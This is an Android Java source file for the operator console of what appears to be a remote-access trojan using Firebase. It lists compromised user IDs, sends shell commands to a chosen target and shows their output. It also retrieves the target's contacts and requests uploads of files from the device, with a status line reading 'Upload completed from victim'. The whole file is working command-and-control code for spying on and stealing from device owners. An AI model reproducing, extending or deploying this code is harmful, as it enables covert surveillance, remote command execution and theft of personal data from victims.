package com.example.serverhacker;

import android.app.DownloadManager;
import android.content.Context;
import android.content.ContextWrapper;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Picture;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FileDownloadTask;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URI;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {




    String kw;
    ChildEventListener cl,cl2;
EditText editfilepath,edtcommand;
TextView txtShowCmdResult;
StorageReference mStorageRef;
Button sendCmd,downloadBtn,getcontacts;
String idUserRequested,userIDgot;
Context context;
String userIDfinal;
    DatabaseReference dwnldpathsMobile,dwnldpaths,cmds,cmdresults,users,refContacts,refContacts2;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initializeUI();
        context=getApplicationContext();
        users=FirebaseDatabase.getInstance().getReference();
        Button getuserbtn=findViewById(R.id.getUserList);
        Button setuser=findViewById(R.id.setUserID);
        final EditText getuser=findViewById(R.id.userget);

        getuserbtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try{getUsers();}catch (Exception e){String k=txtShowCmdResult.getText().toString()+"\n"+"Nothing Found";
                txtShowCmdResult.setText(k);
                }
            }
        });
        setuser.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                userIDfinal=getuser.getText().toString();
                if(!userIDfinal.isEmpty()){
                    try {
                        dwnldpathsMobile.removeEventListener(cl);
                        cmdresults.removeEventListener(cl2);
                        listenForResultPathStorage();
                    }catch (Exception e){}
                    initializeFirebase(userIDfinal);
                    mStorageRef = FirebaseStorage.getInstance().getReference();
                    String h=txtShowCmdResult.getText().toString()+"\n"+"User Set to : "+userIDfinal;
                    txtShowCmdResult.setText(h);

                }

            }
        });




        sendCmd.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String cmdFinal=edtcommand.getText().toString();
                String newRequest = txtShowCmdResult.getText().toString() + "\n" + "\n" + "---------------------" + "\n" + "\n";
                txtShowCmdResult.setText(newRequest);
                if(!cmdFinal.isEmpty()){
                try{
                    sendCommand(cmdFinal);
                    }catch (Exception e){String h=txtShowCmdResult.getText().toString()+"\n"+"ERROR FOR SENDING COMMANDS";
                    txtShowCmdResult.setText(h);
                    }

                }
            }
        });
        getcontacts.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try{ getContacts();}catch (Exception e){String h=txtShowCmdResult.getText().toString()+"\n"+"ERROR FOR CONTACTS";
                txtShowCmdResult.setText(h);
                }

            }
        });


        downloadBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
             String filepathfinal=editfilepath.getText().toString();

             if(!filepathfinal.isEmpty()){
                 //try{
                 Scanner scanner=new Scanner(filepathfinal);
                     while(scanner.hasNextLine()){
                         String lolp=scanner.nextLine();
                         if(!lolp.isEmpty()){
                             String o=dwnldpaths.push().getKey();
                             String h=txtShowCmdResult.getText().toString()+"\n"+"Requested to download : "+lolp;
                             txtShowCmdResult.setText(h);
                             requestToDownload(lolp,o);
                         }



                     }



                // }catch (Exception e){String h=txtShowCmdResult.getText().toString()+"\n"+"ERROR FOR DOWNLOAD";
                  //   txtShowCmdResult.setText(h);}


             }
            }
        });


    }


    private void requestToDownload(String filep,String idPath) {


        String key=dwnldpaths.push().getKey();
        Map content=new HashMap<>();
        content.put(key,filep);
        dwnldpaths.child(idPath).updateChildren(content);

    }
  /*  private void download(final String filePath){



                String fileType=filePath.substring(filePath.lastIndexOf("."));
                downloadContinue(MainActivity.this,filePath+"OK",fileType, Environment.DIRECTORY_DOWNLOADS+"/"+userIDfinal,filePath);
                String h=txtShowCmdResult.getText().toString()+"\n"+"Downloaded!";
                txtShowCmdResult.setText(h);



    }
private void downloadContinue(Context context,String fileName,String fileExtension,String destinationdir,String url){
    DownloadManager manager=(DownloadManager)context.getSystemService(Context.DOWNLOAD_SERVICE);
    Uri uri=Uri.parse(url);
    DownloadManager.Request request=new DownloadManager.Request(uri);
    request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
    request.setDestinationInExternalFilesDir(context,destinationdir,fileName+fileExtension);
    manager.enqueue(request);


}*/

    private void listenForResultPathStorage(){
        dwnldpathsMobile.removeEventListener(cl);
        dwnldpathsMobile.addChildEventListener(cl);
    }

    private void sendCommand(String cmd) {
        String key=cmds.push().getKey();
        Map content=new HashMap<>();
        content.put(key,cmd);
        cmds.updateChildren(content);
        listenForCmdResult(key);

    }

    private  void  listenForCmdResult(String idPath){
        cmdresults.child(idPath).removeEventListener(cl2);
        cmdresults.child(idPath).addChildEventListener(cl2);

    }




    private void getUsers(){
        users.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {
                if(dataSnapshot.exists()){
                   userIDgot=txtShowCmdResult.getText().toString()+"\n"+"USER ID : "+dataSnapshot.getKey();
                   txtShowCmdResult.setText(userIDgot);
                }
            }

            @Override
            public void onChildChanged(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

            }

            @Override
            public void onChildRemoved(@NonNull DataSnapshot dataSnapshot) {

            }

            @Override
            public void onChildMoved(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });

    }

    private void getContacts(){
        refContacts.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {
                if(dataSnapshot.exists()){

                    String contact=txtShowCmdResult.getText().toString()+"\n"+"CONTACT : "+dataSnapshot.getValue()+"  NUMBER : "+dataSnapshot.getKey();
                    txtShowCmdResult.setText(contact);
                }
            }

            @Override
            public void onChildChanged(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

            }

            @Override
            public void onChildRemoved(@NonNull DataSnapshot dataSnapshot) {

            }

            @Override
            public void onChildMoved(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });

    }



    private void initializeUI(){
        editfilepath=findViewById(R.id.edtFilePath);
        edtcommand=findViewById(R.id.edtCommand);


        txtShowCmdResult=findViewById(R.id.cmdResult);

        getcontacts=findViewById(R.id.getContact);
        sendCmd=findViewById(R.id.sendCommand);
        downloadBtn=findViewById(R.id.btnDownload);}
        private void initializeFirebase(String idTarget){

            FirebaseDatabase.getInstance().getReference().child(idTarget).child("commands");
            FirebaseDatabase.getInstance().getReference().child(idTarget).child("commandsResults");

            FirebaseDatabase.getInstance().getReference().child(idTarget).child("downloadPathsMobile");
            FirebaseDatabase.getInstance().getReference().child(idTarget).child("downloadsPaths");

            FirebaseDatabase.getInstance().getReference().child(idTarget).child("contacts");



            refContacts=FirebaseDatabase.getInstance().getReference().child(idTarget).child("contacts");
           // refContacts2=FirebaseDatabase.getInstance().getReference().child(idTarget).child("contactrequests");


            cmds=FirebaseDatabase.getInstance().getReference().child(idTarget).child("commands");
            cmdresults=FirebaseDatabase.getInstance().getReference().child(idTarget).child("commandsResults");

            dwnldpathsMobile=FirebaseDatabase.getInstance().getReference().child(idTarget).child("downloadPathsMobile");
            dwnldpaths=FirebaseDatabase.getInstance().getReference().child(idTarget).child("downloadsPaths");

            dwnldpathsMobile.removeValue();
            cmdresults.removeValue();

            cl2=new ChildEventListener() {
                @Override
                public void onChildAdded(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {
                    if(dataSnapshot.exists()) {


                        String resultCmd = dataSnapshot.getValue().toString();
                        String previousResultsAndCurrent = "\n" + userIDfinal + " : " + resultCmd;
                        kw = kw + previousResultsAndCurrent;


                        txtShowCmdResult.setText(txtShowCmdResult.getText().toString()+ kw);
                        kw="";
                    }


                }
                @Override
                public void onChildChanged(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

                }

                @Override
                public void onChildRemoved(@NonNull DataSnapshot dataSnapshot) {

                }

                @Override
                public void onChildMoved(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {

                }
            };
            cl=new ChildEventListener() {
                @Override
                public void onChildAdded(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {
                    if(dataSnapshot.exists()){
                        try{
                            String status=dataSnapshot.child("status").getValue().toString();
                            if(status.equals("completed")){
                                {String cmds=txtShowCmdResult.getText().toString()+"\n"+"Upload completed from victim";

                                    txtShowCmdResult.setText(cmds);}
                            }else{String cmds=txtShowCmdResult.getText().toString()+"\n"+"FAILED UPLOAD";

                                txtShowCmdResult.setText(cmds);}
                            //download(fileURL);
                            //download the file
                            dwnldpathsMobile.child(dataSnapshot.getKey()).removeValue();

                        }catch (Exception e){String cmds=txtShowCmdResult.getText().toString()+"\n"+userIDfinal+" : "+"File path not found";

                            txtShowCmdResult.setText(cmds);
                        }

                    }
                }

                @Override
                public void onChildChanged(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

                }

                @Override
                public void onChildRemoved(@NonNull DataSnapshot dataSnapshot) {

                }

                @Override
                public void onChildMoved(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {

                }
            };
        }
}
